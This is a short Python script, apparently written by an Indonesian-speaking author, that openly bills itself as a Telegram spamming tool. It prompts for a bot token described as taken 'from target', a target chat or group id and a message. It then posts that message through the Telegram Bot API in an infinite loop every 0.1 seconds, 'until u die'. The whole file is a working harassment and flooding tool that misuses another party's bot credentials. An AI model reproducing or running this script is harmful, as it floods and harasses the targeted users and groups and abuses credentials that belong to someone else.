#!/usr/bin/env python3

import requests
import time
import os

kocak = """
             ~ Made with Dymles Ganz
  ▀█▀ █▀▀ █░░ █▀▀   █▀ █▀█ ▄▀█ █▀▄▀█
  ░█░ ██▄ █▄▄ ██▄   ▄█ █▀▀ █▀█ █░▀░█
  """

putih = '\033[1;97m'
merah = '\033[1;91m'
hijau = '\033[1;92m'
kuning = '\033[1m\033[93m'
biru = '\033[1;94m'
reset = '\033[0m'
putihmerah = '\033[97m\033[41m'
putihhijau = '\033[97m\033[42m'
merahhijau = '\033[1;91m\033[42m'

print(f"{hijau}{kocak}")
print(f"{hijau} This is tools telegram spamming with api bot")
print(f"{hijau} Just give the token bot from target (without bot)")
print(f" {hijau}And enter chat id target too, group or user id")
print(f" {hijau}Don't forget to sumbit this fuxkin message to spam")
print(f" {hijau}Program will be spamming loop until u die!\n")
api_token = input(f"   {reset}[{merah}#{reset}] ENTER BOT TOKEN       {merah}:{reset} ")
chat_id = input(f"   [{merah}*{reset}] ENTER CHAT ID       {merah}:{reset} ")
message = input(f"   [{merah}!{reset}] MESSAGE TO SPAM       {merah}:{reset} ")
print(f"  {biru}Trying Verification...")
time.sleep(3.5)
print(f"  {kuning}Starting...{reset}")

url = f"https://api.telegram.org/bot{api_token}/sendMessage"

data = {
    "chat_id": chat_id,
    "text": message,
    "parse_mode": "Markdown"
}

while True:
    try:
        response = requests.post(url, data=data)
        if response.status_code == 200:
            print(f"{hijau}Success sending message to chat {kuning}{chat_id}!!{reset}")
        else:
            print(f"{merah}Fail!", response.status_code, response.text)

        time.sleep(0.1)
    except Exception as e:
        print(f"{merah}Error:", e)
        break
